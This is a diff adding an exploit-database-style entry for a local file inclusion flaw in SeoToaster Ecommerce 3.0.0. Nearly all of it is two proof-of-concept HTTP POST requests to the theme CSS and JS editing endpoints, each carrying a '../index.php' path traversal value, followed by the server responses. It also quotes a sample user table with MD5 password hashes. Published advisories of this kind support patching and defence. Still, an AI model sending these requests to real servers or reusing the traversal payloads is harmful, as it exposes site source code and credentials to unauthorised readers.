@@ -1,0 +1,82 @@
+# Exploit Title: SeoToaster Ecommerce 3.0.0 - Local File Inclusion
+# Dork: N/A
+# Date: 2019-01-17
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.seotoaster.com/shopping-cart/
+# Software Link: https://www.seotoaster.com/downloads/seotoaster.v3.0.0.zip
+# Version: 3.0.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+
+# /* `exploitdb`.`user` */
+# $user = array(
+#   array('id' => '1','role_id' => 'superadmin','password' => '21232f297a57a5a743894a0e4a801fc3','email' =>....
+#   array('id' => '2','role_id' => 'sales person','password' => 'b2e790a52146d5ec2f635c6bc699da91','email' =>....
+#   array('id' => '3','role_id' => 'copywriter','password' => 'd2af88cb19d3db3375266b63bfe8c55c','email' =>....
+# );
+
+# Tested role_id : sales person,copywriter
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/backend/backend_theme/editcss/
+# 
+
+POST /[PATH]/backend/backend_theme/editcss/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+Cookie: hideAdminPanel=0; currSectionOpen=0; PHPSESSID=0u6ftq75vn79fs3512mli59jo3; mwui=eyJhZG1pbnNpZGViYXJwaW4iOiJ0cnVlIn0%3D; back_to_admin=http%3A//localhost/ExploitDb/latest/admin/view%3Asettings
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+getcss=../index.php: undefined
+HTTP/1.1 200 OK
+Date: Thu, 17 Jan 2019 17:11:17 GMT
+Server: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/7.0.32
+X-Powered-By: PHP/7.0.32
+X-Frame-Options: SAMEORIGIN
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 2109
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/json
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/backend/backend_theme/editjs/
+# 
+
+POST /[PATH]/backend/backend_theme/editjs/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+Cookie: hideAdminPanel=0; currSectionOpen=0; PHPSESSID=0u6ftq75vn79fs3512mli59jo3; mwui=eyJhZG1pbnNpZGViYXJwaW4iOiJ0cnVlIn0%3D; back_to_admin=http%3A//localhost/ExploitDb/latest/admin/view%3Asettings
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+getjs=../index.php: undefined
+HTTP/1.1 200 OK
+Date: Thu, 17 Jan 2019 17:11:41 GMT
+Server: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/7.0.32
+X-Powered-By: PHP/7.0.32
+X-Frame-Options: SAMEORIGIN
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 2109
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: application/json
